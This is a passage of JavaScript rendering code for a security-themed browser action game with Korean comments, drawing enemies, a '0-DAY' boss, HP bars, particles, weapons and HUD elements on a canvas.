    ctx.restore();
  }
  // 충격파
  for (const w of game.waves) {
    ctx.save(); ctx.translate(w.x, w.y); ctx.rotate(w.ang);
    const g = ctx.createLinearGradient(-70, 0, 30, 0); g.addColorStop(0, 'rgba(128,216,255,0)'); g.addColorStop(1, 'rgba(200,240,255,0.95)');
    ctx.fillStyle = g; ctx.beginPath(); ctx.ellipse(-10, 0, 60, w.r, 0, -Math.PI / 2, Math.PI / 2); ctx.fill();
    ctx.restore();
  }
  // 적 탄 (패킷)
  for (const b of game.bullets) {
    if (!inView(b.x, b.y)) continue;
    ctx.fillStyle = b.color; ctx.shadowColor = b.color; ctx.shadowBlur = 12;
    ctx.fillRect(b.x - b.r, b.y - b.r * 0.7, b.r * 2, b.r * 1.4);
    ctx.shadowBlur = 0; ctx.fillStyle = '#fff'; ctx.fillRect(b.x - b.r * 0.6, b.y - 1, b.r * 1.2, 2);
  }
  // 번개 (타이핑)
  drawDrones2D();
  for (const b of game.bolts) {
    ctx.strokeStyle = b.gold ? `rgba(255,224,130,${b.life / 0.12})` : `rgba(160,240,255,${b.life / 0.12})`; ctx.lineWidth = 4; ctx.shadowColor = b.gold ? '#ffd740' : '#00e5ff'; ctx.shadowBlur = 14;
    const y1 = b.y1 - (b.z1 || 0), y2 = b.y2 - (b.z2 || 0);
    ctx.beginPath(); ctx.moveTo(b.x1, y1);
    for (let i = 1; i < 6; i++) { const k = i / 6; ctx.lineTo(lerp(b.x1, b.x2, k) + rand(-18, 18), lerp(y1, y2, k) + rand(-18, 18)); }
    ctx.lineTo(b.x2, y2); ctx.stroke(); ctx.shadowBlur = 0;
  }
  drawParticles(inView);
  drawTexts();
  drawScreenFx();
}
// 화면 공간 효과: 무쌍 스피드라인·비네트·플래시 (2D/3D 공용)
function drawScreenFx() {
  ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
  if (player.state === 'musou') {
    ctx.strokeStyle = 'rgba(255,224,130,0.25)'; ctx.lineWidth = 2;
    for (let i = 0; i < 26; i++) { const a = Math.random() * TAU, r0 = rand(0.3, 0.45) * Math.max(W, H), r1 = r0 + rand(60, 200); ctx.beginPath(); ctx.moveTo(W / 2 + Math.cos(a) * r0, H / 2 + Math.sin(a) * r0); ctx.lineTo(W / 2 + Math.cos(a) * r1, H / 2 + Math.sin(a) * r1); ctx.stroke(); }
  }
  // 비네트·플래시
  const vg = ctx.createRadialGradient(W / 2, H / 2, Math.min(W, H) * 0.35, W / 2, H / 2, Math.max(W, H) * 0.75);
  vg.addColorStop(0, 'rgba(0,0,0,0)'); vg.addColorStop(1, game.vignette > 0 ? `rgba(160,0,20,${0.35 + game.vignette * 0.4})` : (player.hp / player.maxhp < 0.25 ? `rgba(160,0,20,${0.3 + Math.sin(game.titleT * 6) * 0.15})` : 'rgba(0,0,0,0.55)'));
  ctx.fillStyle = vg; ctx.fillRect(0, 0, W, H);
  if (game.typing) { ctx.fillStyle = 'rgba(0,20,30,0.35)'; ctx.fillRect(0, 0, W, H); }
  if (game.flash > 0) { ctx.globalAlpha = Math.min(1, game.flash); ctx.fillStyle = game.flashColor; ctx.fillRect(0, 0, W, H); ctx.globalAlpha = 1; }
}

// GIJO 토큰: 금색 육각 엠블럼 (2D 모드 · 3D 오버레이 공용, 현재 변환 좌표계에 그림)
function drawGijoToken(x, y, s) {
  const T = game.titleT;
  ctx.save(); ctx.translate(x, y); ctx.scale(s, s);
  const beam = ctx.createLinearGradient(0, -220, 0, 10);
  beam.addColorStop(0, 'rgba(255,215,64,0)'); beam.addColorStop(1, 'rgba(255,215,64,0.35)');
  ctx.fillStyle = beam; ctx.fillRect(-16, -220, 32, 230);
  ctx.rotate(Math.sin(T * 2) * 0.15);
  ctx.shadowColor = '#ffd740'; ctx.shadowBlur = 24;
  ctx.beginPath(); for (let i = 0; i < 6; i++) { const a = i / 6 * TAU + Math.PI / 6; ctx.lineTo(Math.cos(a) * 30, Math.sin(a) * 30); } ctx.closePath();
  const g = ctx.createLinearGradient(0, -30, 0, 30); g.addColorStop(0, '#fff3c4'); g.addColorStop(0.5, '#ffc400'); g.addColorStop(1, '#b8860b');
  ctx.fillStyle = g; ctx.fill(); ctx.shadowBlur = 0;
  ctx.strokeStyle = '#fff8e1'; ctx.lineWidth = 2.5; ctx.stroke();
  ctx.fillStyle = '#3e2700'; ctx.font = `17px ${FONT_BIG}`; ctx.textAlign = 'center'; ctx.textBaseline = 'middle'; ctx.fillText('GIJO', 0, 1);
  ctx.textBaseline = 'alphabetic';
  ctx.restore();
}
// 3D 모드 위에 얹는 2D 레이어: 이름표·HP·데미지 숫자·거점 라벨 (월드 좌표 → 화면 투영)
function drawOverlay3D() {
  const R = window.R3D, P = (x, y, h) => R.toScreen(x, y, h);
  ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
  ctx.textAlign = 'center';
  // 거점 라벨: 가까울수록 또렷, 멀면 이름만 흐리게 (화면 정돈)
  const fps = isFPS();
  for (const b of game.bases) {
    const dist = Math.hypot(b.x - player.x, b.y - player.y);
    const a = clamp(1.25 - dist / 1400, 0, 1); if (a <= 0.05) continue;
    const s = P(b.x, b.y, 150); if (!s.vis) continue;
    const en = b.owner === 'enemy', c = en ? '255,110,120' : '90,220,255';
    ctx.globalAlpha = a;
    ctx.font = `${fps ? 20 : 24}px ${FONT_BIG}`; ctx.lineWidth = 4; ctx.strokeStyle = 'rgba(0,0,0,0.6)';
    ctx.strokeText(b.info.base, s.x, s.y); ctx.fillStyle = `rgb(${c})`; ctx.fillText(b.info.base, s.x, s.y);
    if (dist < 700) {
      ctx.globalAlpha = a * clamp((700 - dist) / 200, 0, 1);
      ctx.font = `12px ${FONT}`; ctx.fillStyle = `rgba(${c},0.85)`;
      ctx.fillText(`${b.info.owasp} · ${en ? '위협 점령 중' : '보안 확보'}`, s.x, s.y + 18);
    }
  }
  ctx.globalAlpha = 1;
  const hq = P(HQ.x, HQ.y, 120);
  if (hq.vis && Math.hypot(HQ.x - player.x, HQ.y - player.y) < 1100) { ctx.font = `18px ${FONT_BIG}`; ctx.fillStyle = game.boss ? '#ff5252' : 'rgba(144,164,174,0.7)'; ctx.fillText('C&C 서버', hq.x, hq.y); }
  // 적 이름·HP
  for (const e of game.enemies) {
    if (e.def.big) {
      if (e.type !== 'boss' && Math.hypot(e.x - player.x, e.y - player.y) > 900) continue;
      const s = P(e.x, e.y, e.z + e.r * 2.6 + 26); if (!s.vis) continue;
      const w = Math.max(60, e.r * 2.4 * s.k);
      ctx.fillStyle = 'rgba(0,0,0,0.7)'; ctx.fillRect(s.x - w / 2, s.y, w, 7);
      ctx.fillStyle = e.type === 'keeper' ? '#ff5252' : '#ff1744'; ctx.fillRect(s.x - w / 2, s.y, w * Math.max(0, e.hp / e.maxhp), 7);
      ctx.font = `bold 15px ${FONT}`; ctx.lineWidth = 4; ctx.strokeStyle = '#000';
      ctx.strokeText(e.name || e.def.name, s.x, s.y - 8); ctx.fillStyle = '#fff'; ctx.fillText(e.name || e.def.name, s.x, s.y - 8);
      if (e.title) { ctx.font = `12px ${FONT}`; ctx.strokeText(e.title, s.x, s.y - 26); ctx.fillStyle = '#ffcc80'; ctx.fillText(e.title, s.x, s.y - 26); }
      if (e.groggyT > 0) { ctx.font = `20px ${FONT_BIG}`; ctx.strokeText('그로기! 피해 2배', s.x, s.y - 46); ctx.fillStyle = '#69f0ae'; ctx.fillText('그로기! 피해 2배', s.x, s.y - 46); }
    } else if (e.named) {
      if (Math.hypot(e.x - player.x, e.y - player.y) > 800) continue;
      const s = P(e.x, e.y, e.z + e.r * 2.5 + 12); if (!s.vis) continue;
      const w = Math.max(40, e.r * 2 * s.k);
      ctx.fillStyle = 'rgba(0,0,0,0.6)'; ctx.fillRect(s.x - w / 2, s.y, w, 5); ctx.fillStyle = '#ffca28'; ctx.fillRect(s.x - w / 2, s.y, w * Math.max(0, e.hp / e.maxhp), 5);
      ctx.font = `bold 14px ${FONT}`; ctx.lineWidth = 4; ctx.strokeStyle = '#000'; ctx.strokeText(e.name, s.x, s.y - 6); ctx.fillStyle = '#ffe082'; ctx.fillText(e.name, s.x, s.y - 6);
    } else if (e.hp < e.maxhp || e.windup > 0) {
      const s = P(e.x, e.y, e.z + e.r * 2.3 + 6); if (!s.vis) continue;
      if (e.hp < e.maxhp) {
        const w = Math.max(14, e.r * 1.8 * s.k);
        ctx.fillStyle = 'rgba(0,0,0,0.6)'; ctx.fillRect(s.x - w / 2, s.y, w, 3);
        ctx.fillStyle = '#ff5252'; ctx.fillRect(s.x - w / 2, s.y, w * Math.max(0, e.hp / e.maxhp), 3);
      }
      if (e.windup > 0) { ctx.fillStyle = '#ff1744'; ctx.font = `bold 18px ${FONT}`; ctx.fillText('!', s.x, s.y - 4); }
    }
  }
  // GIJO 토큰 라벨
  for (const it of game.items) if (it.kind === 'gijo') {
    const s = P(it.x, it.y, 70); if (!s.vis) continue;
    ctx.font = `16px ${FONT_BIG}`; ctx.lineWidth = 4; ctx.strokeStyle = '#000';
    ctx.strokeText('◆ GIJO ◆', s.x, s.y); ctx.fillStyle = '#ffd740'; ctx.fillText('◆ GIJO ◆', s.x, s.y);
  }
  // 떠다니는 텍스트
  for (const t of game.texts) {
    const s = P(t.x, t.y, 40); if (!s.vis) continue;
    const k = t.life / t.max;
    ctx.globalAlpha = Math.min(1, k * 2.5);
    const sz = Math.round(t.size * (1 + t.pop * 0.5) * clamp(s.k, 0.7, 1.4) / 2) * 2;
    ctx.font = `${t.bold ? '900 ' : 'bold '}${sz}px ${FONT}`;
    ctx.lineWidth = Math.max(3, sz / 5); ctx.strokeStyle = 'rgba(0,0,0,0.85)';
    ctx.strokeText(t.txt, s.x, s.y); ctx.fillStyle = t.color; ctx.fillText(t.txt, s.x, s.y);
  }
  ctx.globalAlpha = 1;
  drawScreenFx();
  if (isFPS() && game.state === 'play') drawFpsHud();
}
// 1인칭 전용: 조준점 + 화면 밖 위협 방향 화살표
function drawFpsHud() {
  ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
  const cx = W / 2, cy = H / 2, p = player;
  const atk = p.state === 'attack' ? 6 : 0;
  if (isFirstPerson()) {
  ctx.strokeStyle = 'rgba(255,255,255,0.85)'; ctx.lineWidth = 2;
  ctx.beginPath();
  ctx.moveTo(cx - 14 - atk, cy); ctx.lineTo(cx - 5 - atk, cy); ctx.moveTo(cx + 5 + atk, cy); ctx.lineTo(cx + 14 + atk, cy);
  ctx.moveTo(cx, cy - 14 - atk); ctx.lineTo(cx, cy - 5 - atk); ctx.moveTo(cx, cy + 5 + atk); ctx.lineTo(cx, cy + 14 + atk);
  ctx.stroke();
  if (game.frameHits > 0 || game.comboPop > 0.6) { ctx.strokeStyle = '#ff5252'; ctx.beginPath(); ctx.moveTo(cx - 8, cy - 8); ctx.lineTo(cx + 8, cy + 8); ctx.moveTo(cx + 8, cy - 8); ctx.lineTo(cx - 8, cy + 8); ctx.stroke(); }
  }
  // 위협 화살표: 공격 준비 중이거나 가까운 시야 밖 적
  const R = Math.min(W, H) * 0.36;
  for (const e of game.enemies) {
    const dx = e.x - p.x, dy = e.y - p.y, d = Math.hypot(dx, dy);
    const danger = e.windup > 0 || e.chargeT > 0 || (e.def.big && d < 500);
    if (!danger || d > 520) continue;
    const rel = angDiff(Math.atan2(dy, dx), p.facing);
    if (Math.abs(rel) < 0.6) continue; // 정면에 보이면 생략
    const sa = rel - Math.PI / 2; // 화면 위 = 정면
    const ax = cx + Math.cos(sa) * R, ay = cy + Math.sin(sa) * R;
    ctx.save(); ctx.translate(ax, ay); ctx.rotate(sa + Math.PI / 2);
    ctx.globalAlpha = 0.55 + 0.45 * Math.sin(game.titleT * 14);
    ctx.fillStyle = e.def.big ? '#ffcc00' : '#ff1744';
    ctx.beginPath(); ctx.moveTo(0, -16); ctx.lineTo(11, 6); ctx.lineTo(-11, 6); ctx.closePath(); ctx.fill();
    ctx.restore();
  }
  ctx.globalAlpha = 1;
  if (document.pointerLockElement !== cv && game.time < 25) {
    ctx.globalAlpha = clamp((25 - game.time) / 5, 0, 1);
    ctx.font = `13px ${FONT}`; ctx.textAlign = 'center'; ctx.fillStyle = 'rgba(255,255,255,0.55)';
    ctx.fillText('←→ 회전 · W/S 전후 · A/D 옆걸음 · 화면 클릭 = 마우스 시점(좌클릭 J · 우클릭 K)', cx, H - 92);
    ctx.globalAlpha = 1;
  }
}
function drawDrones2D() {
  for (const d of game.drones) {
    ctx.save(); ctx.translate(d.x, d.y - 46); ctx.rotate(game.titleT * 6);
    ctx.shadowColor = '#ffd740'; ctx.shadowBlur = 14; ctx.fillStyle = '#ffd740';
    ctx.beginPath(); ctx.moveTo(0, -10); ctx.lineTo(8, 0); ctx.lineTo(0, 10); ctx.lineTo(-8, 0); ctx.closePath(); ctx.fill();
    ctx.shadowBlur = 0; ctx.restore();
  }
}

function drawEnemy(e) {
  const t = e.def;
  let alpha = 1;
  if (t.stealth) { const d = Math.hypot(e.x - player.x, e.y - player.y); alpha = d < 200 || e.flash > 0 || e.windup > 0 ? 1 : 0.25 + 0.2 * Math.sin(game.titleT * 5 + e.seed); }
  ctx.globalAlpha = alpha;
  const y = e.y - e.z;
  if (e.type === 'boss') { drawBoss(e); ctx.globalAlpha = 1; return; }
  // 웜 몸통
  if (t.segs && e.trail.length > 2) {
    for (let i = t.segs; i >= 1; i--) {
      const p = e.trail[Math.min(e.trail.length - 1, i * 3)];
      const r = t.r * (1 - i * 0.08);
      ctx.fillStyle = e.flash > 0 ? '#fff' : (i % 2 ? '#e07b00' : t.color);
      ctx.beginPath(); ctx.arc(p.x, p.y - e.z, r, 0, TAU); ctx.fill();
    }
  }
  const s = SPR[e.type];
  const img = e.flash > 0 ? s.w : s.n;
  const sw = img.width / 2, sh = img.height / 2;
  // 공격 예고 글로우
  if (e.windup > 0) {
    ctx.fillStyle = `rgba(255,40,40,${0.35 + 0.3 * Math.sin(game.titleT * 40)})`;
    ctx.beginPath(); ctx.arc(e.x, y, e.r + 8, 0, TAU); ctx.fill();
  }
  if (t.rotate) {
    ctx.save(); ctx.translate(e.x, y); ctx.rotate(e.heading + Math.PI / 2);
    ctx.drawImage(img, -sw / 2, -sh / 2, sw, sh); ctx.restore();
  } else if (t.spin) {
    ctx.save(); ctx.translate(e.x, y); ctx.rotate(game.titleT * 1.5 + e.seed);
    ctx.drawImage(img, -sw / 2, -sh / 2, sw, sh); ctx.restore();
  } else {
    const sq = e.stun > 0 && !t.big ? 1 + Math.sin(game.titleT * 50) * 0.08 : 1;
    ctx.drawImage(img, e.x - sw / 2 * sq, y - sh / 2 / sq, sw * sq, sh / sq);
  }
  if (e.chargeT > 0) { ctx.strokeStyle = 'rgba(179,136,255,0.8)'; ctx.lineWidth = 3; ctx.beginPath(); ctx.arc(e.x, y, e.r + 6, 0, TAU); ctx.stroke(); }
  ctx.globalAlpha = 1;
  if (e.windup > 0 && !t.big) { ctx.fillStyle = '#ff1744'; ctx.font = `bold 18px ${FONT}`; ctx.textAlign = 'center'; ctx.fillText('!', e.x, y - e.r - 8); }
  // HP / 이름
  if (e.named && !t.big) {
    ctx.font = `bold 13px ${FONT}`; ctx.textAlign = 'center'; ctx.lineWidth = 4; ctx.strokeStyle = '#000';
    ctx.strokeText(e.name, e.x, y - e.r - 14); ctx.fillStyle = '#ffe082'; ctx.fillText(e.name, e.x, y - e.r - 14);
  }
  if (e.groggyT > 0) { ctx.font = `18px ${FONT_BIG}`; ctx.textAlign = 'center'; ctx.fillStyle = '#69f0ae'; ctx.fillText('그로기!', e.x, y - e.r - 70); }
  if (t.big) {
    const w = e.r * 2.6;
    ctx.fillStyle = 'rgba(0,0,0,0.7)'; ctx.fillRect(e.x - w / 2, y - e.r - 26, w, 7);
    ctx.fillStyle = e.type === 'keeper' ? '#ff5252' : '#ff1744'; ctx.fillRect(e.x - w / 2, y - e.r - 26, w * Math.max(0, e.hp / e.maxhp), 7);
    ctx.font = `bold 15px ${FONT}`; ctx.textAlign = 'center'; ctx.lineWidth = 4; ctx.strokeStyle = '#000';
    ctx.strokeText(e.name || t.name, e.x, y - e.r - 34); ctx.fillStyle = '#fff'; ctx.fillText(e.name || t.name, e.x, y - e.r - 34);
    if (e.title) { ctx.font = `12px ${FONT}`; ctx.strokeText(e.title, e.x, y - e.r - 52); ctx.fillStyle = '#ffcc80'; ctx.fillText(e.title, e.x, y - e.r - 52); }
  } else if (e.hp < e.maxhp) {
    const w = e.r * 2;
    ctx.fillStyle = 'rgba(0,0,0,0.6)'; ctx.fillRect(e.x - w / 2, y - e.r - 9, w, 3);
    ctx.fillStyle = '#ff5252'; ctx.fillRect(e.x - w / 2, y - e.r - 9, w * Math.max(0, e.hp / e.maxhp), 3);
  }
}

function drawBoss(e) {
  const y = e.y - e.z, T = game.titleT, r = e.r;
  ctx.save(); ctx.translate(e.x, y);
  for (let i = 0; i < 3; i++) {
    ctx.strokeStyle = `rgba(255,${40 + i * 60},${80 + i * 40},${0.7 - i * 0.15})`; ctx.lineWidth = 5 - i;
    ctx.beginPath(); ctx.ellipse(0, 0, r * (1.3 + i * 0.25), r * (0.5 + i * 0.12), T * (0.8 + i * 0.5) * (i % 2 ? -1 : 1), 0, TAU); ctx.stroke();
  }
  const g = ctx.createRadialGradient(-r * 0.3, -r * 0.3, 4, 0, 0, r);
  g.addColorStop(0, e.flash > 0 ? '#fff' : '#ff8aa0'); g.addColorStop(0.5, e.flash > 0 ? '#fff' : '#d0003a'); g.addColorStop(1, '#2a0010');
  ctx.fillStyle = g; ctx.beginPath(); ctx.arc(0, 0, r, 0, TAU); ctx.fill();
  // 눈
  const ang = Math.atan2(player.y - e.y, player.x - e.x);
  ctx.fillStyle = '#fff'; ctx.beginPath(); ctx.ellipse(0, -4, r * 0.55, r * 0.38, 0, 0, TAU); ctx.fill();
  ctx.fillStyle = e.phase === 2 ? '#ff6d00' : '#ff1744'; ctx.beginPath(); ctx.arc(Math.cos(ang) * r * 0.22, -4 + Math.sin(ang) * r * 0.14, r * 0.22, 0, TAU); ctx.fill();
  ctx.fillStyle = '#000'; ctx.beginPath(); ctx.ellipse(Math.cos(ang) * r * 0.25, -4 + Math.sin(ang) * r * 0.16, r * 0.06, r * 0.18, 0, 0, TAU); ctx.fill();
  ctx.font = `bold 18px ${FONT_MONO}`; ctx.textAlign = 'center'; ctx.fillStyle = '#ffcdd2'; ctx.fillText('0-DAY', 0, r * 0.72);
  ctx.restore();
}

function drawPlayer() {
  const p = player, x = p.x, y = p.y - p.z, f = p.flip;
  const blink = p.inv > 0 && p.state !== 'musou' && p.state !== 'dash' && p.hurtT > 0 && Math.sin(game.titleT * 60) > 0;
  if (blink) ctx.globalAlpha = 0.5;
  // 무쌍 오라
  if (p.state === 'musou' || p.quizBuffT > 0 || p.patchT > 0 || game.gijoT > 0) {
    const c = p.state === 'musou' || game.gijoT > 0 ? '255,193,7' : p.quizBuffT > 0 ? '0,229,255' : '105,240,174';
    const g = ctx.createRadialGradient(x, y - 10, 5, x, y - 10, 70);
    g.addColorStop(0, `rgba(${c},0.45)`); g.addColorStop(1, `rgba(${c},0)`);
    ctx.fillStyle = g; ctx.beginPath(); ctx.arc(x, y - 10, 70, 0, TAU); ctx.fill();
  }
  // 슬래시 궤적
  const a = p.atk;
  if (p.state === 'attack' && a && (a.kind === 'arc' || a.kind === 'tornado')) {
    const k0 = clamp((p.t - a.a0 + 0.03) / (a.a1 - a.a0 + 0.06), 0, 1);
    const fade = p.t > a.a1 ? Math.max(0, 1 - (p.t - a.a1) / 0.12) : 1;
    if (a.kind === 'tornado') {
      ctx.strokeStyle = `rgba(128,216,255,${0.5 * fade})`; ctx.lineWidth = 22;
      for (let i = 0; i < 2; i++) { ctx.beginPath(); ctx.arc(x, y - 10, a.range * (0.7 + i * 0.25), p.facing + i * 2, p.facing + i * 2 + 2.6); ctx.stroke(); }
    } else {
      const arc = a.arc * Math.PI / 180;
      const s = p.facing - (arc / 2) * a.dir, cur = s + arc * k0 * a.dir;
      for (let L = 0; L < 3; L++) {
        ctx.strokeStyle = L === 0 ? `rgba(80,180,255,${0.35 * fade})` : L === 1 ? `rgba(160,230,255,${0.7 * fade})` : `rgba(255,255,255,${0.95 * fade})`;
        ctx.lineWidth = [30, 14, 4][L];
        ctx.beginPath(); ctx.arc(x, y - 8, a.range * [0.72, 0.8, 0.88][L], Math.min(s, cur), Math.max(s, cur)); ctx.stroke();
      }
      p.swingAng = cur;
    }
  }
  // 몸
  const bob = p.state === 'move' ? Math.sin(p.walk) * 2.5 : 0;
  const leg = p.state === 'move' ? Math.sin(p.walk) * 5 : 0;
  ctx.fillStyle = '#1b2333'; ctx.fillRect(x - 9 + leg * 0.3, y + 4, 7, 14); ctx.fillRect(x + 2 - leg * 0.3, y + 4, 7, 14);
  ctx.fillStyle = '#263859'; rr(ctx, x - 15, y - 22 + bob, 30, 30, 9); ctx.fill();
  ctx.fillStyle = '#1a2740'; ctx.fillRect(x - 15, y - 2 + bob, 30, 5);
  // 사원증
  ctx.strokeStyle = '#ff5252'; ctx.lineWidth = 1.5; ctx.beginPath(); ctx.moveTo(x - 6, y - 21 + bob); ctx.lineTo(x, y - 8 + bob); ctx.lineTo(x + 6, y - 21 + bob); ctx.stroke();
  ctx.fillStyle = '#fff'; ctx.fillRect(x - 4, y - 9 + bob, 8, 10); ctx.fillStyle = '#2962ff'; ctx.fillRect(x - 4, y - 9 + bob, 8, 3);
  // 머리
  ctx.fillStyle = '#ffd7b0'; ctx.beginPath(); ctx.arc(x, y - 32 + bob, 12, 0, TAU); ctx.fill();
  ctx.fillStyle = '#20160f'; ctx.beginPath(); ctx.arc(x, y - 36 + bob, 12.5, Math.PI * 1.05, Math.PI * 1.95); ctx.fill();
  ctx.fillRect(x - 12, y - 38 + bob, 24, 4);
  // 안경 + 다크서클
  ctx.strokeStyle = '#111'; ctx.lineWidth = 1.8;
  ctx.strokeRect(x - 9 + f * 2, y - 34 + bob, 7, 5); ctx.strokeRect(x + 1 + f * 2, y - 34 + bob, 7, 5);
  ctx.fillStyle = 'rgba(90,60,120,0.5)'; ctx.fillRect(x - 8 + f * 2, y - 28 + bob, 6, 2); ctx.fillRect(x + 2 + f * 2, y - 28 + bob, 6, 2);
  // 헤드셋
  ctx.strokeStyle = '#37474f'; ctx.lineWidth = 3; ctx.beginPath(); ctx.arc(x, y - 33 + bob, 14, Math.PI * 1.1, Math.PI * 1.9); ctx.stroke();
  ctx.fillStyle = '#00e5ff'; ctx.fillRect(x - 16, y - 34 + bob, 4, 7); ctx.fillRect(x + 12, y - 34 + bob, 4, 7);
  // 무기: 거대 기계식 키보드
  let wa;
  if (p.state === 'attack' && a) {
    if (a.kind === 'arc') wa = p.swingAng ?? p.facing;
    else if (a.kind === 'pound') wa = p.t < a.a0 ? -Math.PI / 2 - 0.4 * f : Math.PI / 2;
    else if (a.kind === 'radial') wa = p.facing + p.t * 18;
    else wa = p.facing;
  } else if (p.state === 'musou') wa = p.facing;
  else wa = p.facing + 0.9 * f;
  ctx.save(); ctx.translate(x, y - 12 + bob); ctx.rotate(wa);
  const wid = curWeapon().id;
  if (wid === 'lan') { ctx.strokeStyle = '#1e88e5'; ctx.lineWidth = 4; ctx.beginPath(); ctx.moveTo(10, 0); for (let i = 1; i <= 14; i++) ctx.lineTo(10 + i * 10, Math.sin(i * 0.8 + game.titleT * 10) * 4); ctx.stroke(); ctx.fillStyle = '#eceff1'; ctx.fillRect(148, -5, 12, 10); }
  else if (wid === 'hammer') { ctx.fillStyle = '#37474f'; ctx.fillRect(10, -3, 80, 6); ctx.fillStyle = '#1c2433'; ctx.fillRect(84, -20, 30, 40); ctx.fillStyle = '#00e676'; for (let i = 0; i < 4; i++) ctx.fillRect(88, -15 + i * 9, 4, 3); }
  else if (wid === 'flail') { ctx.fillStyle = '#37474f'; ctx.fillRect(10, -3, 34, 6); ctx.strokeStyle = '#90a4ae'; ctx.lineWidth = 2; ctx.beginPath(); ctx.moveTo(44, 0); ctx.lineTo(80, 8); ctx.stroke(); ctx.fillStyle = '#f5f5f5'; rr(ctx, 78, -2, 28, 20, 9); ctx.fill(); }
  else if (wid === 'shield') { ctx.fillStyle = '#37474f'; ctx.fillRect(10, -3, 20, 6); const g2 = ctx.createLinearGradient(28, -30, 28, 30); g2.addColorStop(0, '#ffeb3b'); g2.addColorStop(1, '#ff1744'); ctx.fillStyle = g2; ctx.fillRect(28, -30, 12, 60); }
  else if (wid === 'gijo') { ctx.fillStyle = '#ffd740'; ctx.shadowColor = '#ffd740'; ctx.shadowBlur = 12; ctx.fillRect(14, -5, 96, 10); ctx.shadowBlur = 0; ctx.fillStyle = '#3e2700'; ctx.font = `10px ${FONT_BIG}`; ctx.fillText('GIJO', 22, 4); }
  else {
    ctx.fillStyle = '#2b2f3a'; rr(ctx, 14, -12, 84, 24, 4); ctx.fill();
    const rgb = `hsl(${(game.titleT * 200) % 360},100%,60%)`;
    ctx.strokeStyle = rgb; ctx.lineWidth = 2; rr(ctx, 14, -12, 84, 24, 4); ctx.stroke();
    ctx.fillStyle = '#d8dee9';
    for (let r = 0; r < 3; r++) for (let c = 0; c < 10; c++) ctx.fillRect(18 + c * 7.8, -9 + r * 7, 6, 5);
    ctx.fillStyle = '#ff5252'; ctx.fillRect(18 + 9 * 7.8, -9 + 14, 6, 5);
  }
  ctx.restore();
  ctx.globalAlpha = 1;
}

function drawParticles(inView) {
  for (const p of game.particles) {
    if (p.x !== undefined && !inView(p.x, p.y, 300)) continue;
    const k = Math.max(0, p.life / p.max);
    switch (p.type) {
      case 'spark':
        ctx.strokeStyle = p.color; ctx.globalAlpha = k; ctx.lineWidth = p.size;
        ctx.beginPath(); ctx.moveTo(p.x, p.y); ctx.lineTo(p.x - p.vx * 0.03, p.y - p.vy * 0.03); ctx.stroke(); break;
      case 'bin':
        ctx.globalAlpha = k; ctx.fillStyle = p.color; ctx.font = `bold ${p.size}px ${FONT_MONO}`; ctx.textAlign = 'center'; ctx.fillText(p.txt, p.x, p.y); break;
      case 'key':
        ctx.globalAlpha = Math.min(1, k * 2); ctx.save(); ctx.translate(p.x, p.y); ctx.rotate(p.rot);
        ctx.font = `bold 11px ${FONT}`; const tw = ctx.measureText(p.txt).width + 10;
        ctx.fillStyle = '#9aa3b5'; rr(ctx, -tw / 2, -9, tw, 20, 4); ctx.fill();
        ctx.fillStyle = '#eef1f7'; rr(ctx, -tw / 2 + 1, -10, tw - 2, 16, 3); ctx.fill();
        ctx.fillStyle = '#333'; ctx.textAlign = 'center'; ctx.textBaseline = 'middle'; ctx.fillText(p.txt, 0, -2); ctx.textBaseline = 'alphabetic';
        ctx.restore(); break;
      case 'ring': {
        const r = lerp(p.r0, p.r1, 1 - k * k);
        ctx.globalAlpha = k; ctx.strokeStyle = p.color; ctx.lineWidth = p.width * k + 1;
        ctx.beginPath(); ctx.arc(p.x, p.y, r, 0, TAU); ctx.stroke(); break;
      }
      case 'dust':
        ctx.globalAlpha = k * 0.6; ctx.fillStyle = p.color; ctx.beginPath(); ctx.arc(p.x, p.y, p.size * (1.5 - k * 0.5), 0, TAU); ctx.fill(); break;
      case 'ghost':
        ctx.globalAlpha = k * 0.4; ctx.fillStyle = '#00e5ff'; rr(ctx, p.x - 15, p.y - 44, 30, 62, 10); ctx.fill(); break;
      case 'slash': {
        ctx.globalAlpha = k; ctx.strokeStyle = p.color; ctx.lineWidth = 10 * k + 2;
        ctx.beginPath(); ctx.arc(player.x, player.y - 10, p.r, p.ang, p.ang + 2.2); ctx.stroke(); break;
      }
    }
  }
  ctx.globalAlpha = 1;
}
function drawTexts() {
  ctx.textAlign = 'center';
  for (const t of game.texts) {
    const k = t.life / t.max;
    ctx.globalAlpha = Math.min(1, k * 2.5);
    const sz = t.size * (1 + t.pop * 0.5);
    ctx.font = `${t.bold ? '900 ' : 'bold '}${sz}px ${FONT}`;
    ctx.lineWidth = Math.max(3, sz / 5); ctx.strokeStyle = 'rgba(0,0,0,0.85)';
    ctx.strokeText(t.txt, t.x, t.y); ctx.fillStyle = t.color; ctx.fillText(t.txt, t.x, t.y);
  }
  ctx.globalAlpha = 1;
}

// ── HUD ──
function bar(x, y, w, h, v, col, bg = 'rgba(0,0,0,0.6)') {
  ctx.fillStyle = bg; rr(ctx, x, y, w, h, h / 2); ctx.fill();
  if (v > 0) { ctx.fillStyle = col; rr(ctx, x, y, Math.max(h, w * clamp(v, 0, 1)), h, h / 2); ctx.fill(); }
  ctx.strokeStyle = 'rgba(255,255,255,0.18)'; ctx.lineWidth = 1; rr(ctx, x, y, w, h, h / 2); ctx.stroke();
}
function drawHUD() {
  ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
  const p = player, T = game.titleT;
  const s = clamp(Math.min(W / 1400, H / 820), 0.4, 1.15);
  ctx.save(); ctx.scale(s, s);
  const Wv = W / s, Hv = H / s;
  // 좌상단: 상태
  ctx.fillStyle = 'rgba(8,14,28,0.75)'; rr(ctx, 16, 16, 360, 118, 12); ctx.fill();
  ctx.strokeStyle = 'rgba(0,229,255,0.35)'; ctx.lineWidth = 1.5; rr(ctx, 16, 16, 360, 118, 12); ctx.stroke();
  ctx.font = `20px ${FONT_BIG}`; ctx.fillStyle = '#e0f7fa'; ctx.textAlign = 'left';
  ctx.fillText(`보안담당자  Lv.${p.level}`, 30, 44);
  ctx.fillStyle = 'rgba(8,14,28,0.75)'; rr(ctx, 16, 138, 360, 26, 8); ctx.fill();
  ctx.font = `bold 13px ${FONT}`; ctx.fillStyle = '#b2ff59'; ctx.fillText(`⚔ ${curWeapon().name}`, 30, 156);
